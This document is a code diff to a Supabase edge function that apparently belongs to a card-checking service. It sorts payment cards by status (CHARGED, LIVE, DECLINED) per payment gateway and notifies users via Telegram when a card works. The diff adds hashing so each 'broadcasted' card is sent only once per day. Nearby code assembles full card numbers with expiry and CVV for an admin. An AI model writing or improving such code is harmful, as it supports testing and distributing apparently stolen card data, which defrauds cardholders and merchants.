@@ -272,6 +272,14 @@ async function sendTelegramPhoto(chatId: string, photoUrl: string, caption: stri
   }
 }
 
+// Generate SHA-256 hash for card deduplication
+async function hashCard(cardDetails: string, gateway: string): Promise<string> {
+  const data = new TextEncoder().encode(`${cardDetails}|${gateway}`);
+  const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+  const hashArray = Array.from(new Uint8Array(hashBuffer));
+  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+}
+
 serve(async (req) => {
   // Handle CORS preflight requests
   if (req.method === 'OPTIONS') {
@@ -294,6 +302,58 @@ serve(async (req) => {
     // Initialize Supabase client
     const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
 
+    // Handle UNKNOWN status - Skip notification
+    if (status === "UNKNOWN") {
+      console.log("[NOTIFY-CHARGED] UNKNOWN status - skipping user notification");
+      return new Response(
+        JSON.stringify({ success: true, type: 'unknown_skipped' }),
+        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
+      );
+    }
+
+    // DECLINED cards - Skip user notification entirely
+    if (status === "DECLINED") {
+      console.log("[NOTIFY-CHARGED] DECLINED status - skipping user notification");
+      return new Response(
+        JSON.stringify({ success: true, type: 'declined_skipped' }),
+        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
+      );
+    }
+
+    // ========== DEDUPLICATION CHECK ==========
+    // Generate hash for this card + gateway combination
+    const cardHash = await hashCard(card_details, gateway);
+    
+    // Check if this card was already processed in the last 24 hours
+    const twentyFourHoursAgo = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();
+    
+    const { data: existingBroadcast } = await supabase
+      .from('broadcasted_cards')
+      .select('id')
+      .eq('card_hash', cardHash)
+      .gte('created_at', twentyFourHoursAgo)
+      .limit(1);
+    
+    if (existingBroadcast && existingBroadcast.length > 0) {
+      console.log("[NOTIFY-CHARGED] Duplicate card detected - skipping notification (hash:", cardHash.slice(0, 8), "...)");
+      return new Response(
+        JSON.stringify({ success: true, type: 'duplicate_skipped', hash: cardHash.slice(0, 8) }),
+        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
+      );
+    }
+
+    // Record this card to prevent future duplicates
+    await supabase
+      .from('broadcasted_cards')
+      .insert({
+        card_hash: cardHash,
+        user_id: user_id,
+        gateway: gateway,
+      });
+    
+    console.log("[NOTIFY-CHARGED] Card recorded for dedup (hash:", cardHash.slice(0, 8), "...)");
+    // ========== END DEDUPLICATION CHECK ==========
+
     // Get user's Telegram chat ID and username
     const { data: profile, error: profileError } = await supabase
       .from('profiles')
@@ -313,27 +373,6 @@ serve(async (req) => {
 
     // Full card for admin debug (LIVE cards show full details)
     const fullCardForAdmin = `${cardNum}|${mm}|${yy}|${cvv}`;
-    
-    
-    // Handle UNKNOWN status - Send debug info to admin only (silent, no user notification)
-    if (status === "UNKNOWN") {
-      console.log("[NOTIFY-CHARGED] UNKNOWN status - skipping user notification");
-      return new Response(
-        JSON.stringify({ success: true, type: 'unknown_skipped' }),
-        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
-      );
-    }
-
-    // DECLINED cards - Skip user notification entirely (only log)
-    if (status === "DECLINED") {
-      console.log("[NOTIFY-CHARGED] DECLINED status - skipping user notification");
-      return new Response(
-        JSON.stringify({ success: true, type: 'declined_skipped' }),
-        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
-      );
-    }
-    
-    // Admin debug notifications disabled
 
     // Only CHARGED/LIVE cards reach here - notify user if they have Telegram linked
     if (profileError || !profile?.telegram_chat_id) {
